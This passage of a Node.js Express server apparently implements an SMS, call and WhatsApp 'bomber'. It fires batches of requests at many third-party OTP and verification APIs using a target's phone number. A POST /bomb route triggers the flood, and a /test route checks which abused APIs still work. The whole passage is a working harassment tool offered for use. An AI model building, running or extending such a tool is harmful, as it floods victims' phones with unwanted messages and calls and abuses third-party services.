                data = api.body(phone);
            } else {
                data = api.body;
            }
            isForm = api.body_type === 'form';
        }

        const method = api.method.toLowerCase();
        const config = { method, url, headers, timeout: API_TIMEOUT, validateStatus: () => true };
        if (params) config.params = params;

        if (method === 'post' || method === 'put') {
            if (data !== null && data !== undefined) {
                if (isForm) {
                    config.data = new URLSearchParams(data).toString();
                    if (!headers['Content-Type'] && !headers['content-type']) headers['Content-Type'] = 'application/x-www-form-urlencoded';
                } else {
                    config.data = data;
                    if (!headers['Content-Type'] && !headers['content-type']) headers['Content-Type'] = 'application/json';
                }
            }
        }

        const response = await axios(config);
        const responseTime = Date.now() - startTime;
        const isAlive = response.status < 500;

        if (isAlive) {
            recordResult(api.name, true, response.status, responseTime);
            logEvent(`${api.name} → ${response.status} (${responseTime}ms)`, response.status < 300 ? 'success' : 'warn');
            return { success: true, status: response.status, responseTime };
        } else {
            recordResult(api.name, false, response.status, responseTime, `HTTP ${response.status}`);
            logEvent(`${api.name} → ${response.status} (${responseTime}ms)`, 'error');
            return { success: false, status: response.status, responseTime };
        }
    } catch (err) {
        const responseTime = Date.now() - startTime;
        const errMsg = err.code || err.message || 'Unknown';

        if (retryCount < 1 && (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNABORTED')) {
            return makeApiCall(api, phone, retryCount + 1);
        }

        recordResult(api.name, false, null, responseTime, errMsg);
        logEvent(`${api.name} → FAIL (${responseTime}ms) ${errMsg}`, 'error');
        return { success: false, status: null, responseTime, error: errMsg };
    }
}

// ============================================================
// ===== BOMBING LOGIC =====
// ============================================================

async function runBombing(phone, effectiveDuration) {
    const startTime = Date.now();
    let success = 0, smsCount = 0, callCount = 0, whatsappCount = 0;

    let maxRequests = 200;
    if (effectiveDuration <= 1) maxRequests = 300;
    else if (effectiveDuration <= 5) maxRequests = 200;
    else maxRequests = 150;

    const shuffled = [...ALL_APIS];
    for (let i = shuffled.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
    }

    let sent = 0;
    const BATCH_SIZE = 10;

    for (let i = 0; i < shuffled.length && sent < maxRequests; i += BATCH_SIZE) {
        const batch = shuffled.slice(i, Math.min(i + BATCH_SIZE, shuffled.length));
        const results = await Promise.allSettled(batch.map(api => makeApiCall(api, phone)));

        for (let k = 0; k < results.length; k++) {
            const result = results[k];
            const api = batch[k];

            if (result.status === 'fulfilled' && result.value && result.value.success) {
                success++;
                sent++;
                if (api.type === 'CALL') callCount++;
                else if (api.type === 'WHATSAPP') whatsappCount++;
                else smsCount++;
            }
        }

        if (i + BATCH_SIZE < shuffled.length && sent < maxRequests) {
            await new Promise(r => setTimeout(r, BATCH_DELAY_MS));
        }
    }

    const elapsed = (Date.now() - startTime) / 1000;
    return { success, smsCount, callCount, whatsappCount, elapsed: elapsed.toFixed(1) };
}

// ============================================================
// ===== ROUTES =====
// ============================================================

app.get('/', (req, res) => {
    res.json({
        status: 'ok',
        instance: process.env.INSTANCE_NAME || 'master-api',
        total_apis: ALL_APIS.length,
        sms_apis: SMS_APIS.length,
        call_apis: CALL_APIS.length,
        whatsapp_apis: WHATSAPP_APIS.length,
        uptime: Math.round(process.uptime()) + 's'
    });
});

app.get('/health', (req, res) => {
    res.json({ status: 'ok', uptime: process.uptime(), apis: ALL_APIS.length });
});

// Test all APIs
app.get('/test', async (req, res) => {
    const phone = req.query.phone || '9999999999';
    logEvent(`🧪 Testing all APIs with ${phone}...`, 'info');
    const results = [];
    for (const api of ALL_APIS) {
        const r = await makeApiCall(api, phone);
        results.push({ name: api.name, type: api.type, ...r });
        await new Promise(r => setTimeout(r, 150));
    }
    const working = results.filter(r => r.success).length;
    logEvent(`🧪 Test complete: ${working}/${results.length} working`, working > 0 ? 'success' : 'error');
    res.json({ phone, total: results.length, working, failed: results.length - working, results });
});

// Stats
app.get('/stats', (req, res) => {
    const arr = Object.values(stats).map(s => ({
        name: s.name,
        type: s.type,
        total: s.total,
        success: s.success,
        failed: s.failed,
        successRate: s.total > 0 ? ((s.success / s.total) * 100).toFixed(1) + '%' : 'N/A',
        status: s.lastStatus || 'NEVER TESTED',
        lastStatusCode: s.lastStatusCode,
        lastError: s.lastError,
        avgResponseTime: s.avgResponseTime + 'ms'
    }));
    res.json({
        summary: {
            total: arr.length,
            working: arr.filter(a => a.status === 'WORKING').length,
            failed: arr.filter(a => a.status === 'FAILED').length,
            untested: arr.filter(a => a.status === 'NEVER TESTED').length
        },
        apis: arr
    });
});

app.get('/logs', (req, res) => {
    res.json({ count: recentLogs.length, logs: recentLogs.slice(-50).reverse() });
});

app.get('/reset-stats', (req, res) => {
    for (const key in stats) {
        stats[key] = { name: stats[key].name, type: stats[key].type, total: 0, success: 0, failed: 0, lastStatus: null, lastStatusCode: null, lastTime: null, lastError: null, avgResponseTime: 0 };
    }
    recentLogs.length = 0;
    logEvent('Stats reset', 'warn');
    res.json({ success: true });
});

// Bombing
app.post('/bomb', async (req, res) => {
    const { phone, duration, instance } = req.body;
    if (!phone || phone.length !== 10) return res.status(400).json({ error: 'Invalid phone number.' });

    const requestedDuration = Number(duration) || 1;
    const effectiveDuration = Math.min(requestedDuration, MAX_DURATION_MIN);

    logEvent(`📱 BOMB | phone=${phone} | duration=${effectiveDuration}min`, 'info');

    try {
        const result = await runBombing(phone, effectiveDuration);
        logEvent(`✅ DONE | ${phone} | Sent: ${result.success} | SMS: ${result.smsCount} | Calls: ${result.callCount} | WA: ${result.whatsappCount} | ${result.elapsed}s`, 'success');
        res.json({
            success: true, phone,
            requested_duration: requestedDuration,
            effective_duration: effectiveDuration,
            instance: instance || 'default',
            totalSent: result.success,
            sms: result.smsCount,
            calls: result.callCount,
            whatsapp: result.whatsappCount,
            elapsed: result.elapsed + 's',
            total_apis: ALL_APIS.length
        });
    } catch (error) {
        logEvent(`❌ BOMB ERROR | ${phone} | ${error.message}`, 'error');
        res.status(500).json({ error: error.message });
    }
});

app.get('/apis', (req, res) => {
    res.json({
        total: ALL_APIS.length,
        sms: SMS_APIS.map(a => a.name),
        call: CALL_APIS.map(a => a.name),
        whatsapp: WHATSAPP_APIS.map(a => a.name)
    });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    console.log('═══════════════════════════════════════════');
    console.log(`🚀 Master API Server on port ${PORT}`);
    console.log(`📊 Total APIs: ${ALL_APIS.length}`);
    console.log(`   📱 SMS: ${SMS_APIS.length}`);
    console.log(`   📞 CALL: ${CALL_APIS.length}`);
    console.log(`   💬 WHATSAPP: ${WHATSAPP_APIS.length}`);
    console.log('═══════════════════════════════════════════');
    console.log('📋 Endpoints:');
    console.log('   GET  /              - Server status');
    console.log('   GET  /health        - Health check');
    console.log('   GET  /test?phone=X  - Test all APIs');
    console.log('   GET  /stats         - Working/failed summary');
    console.log('   GET  /logs          - Recent logs');
    console.log('   GET  /apis          - List all APIs');
    console.log('   POST /bomb          - Trigger bombing');
    console.log('═══════════════════════════════════════════');
});
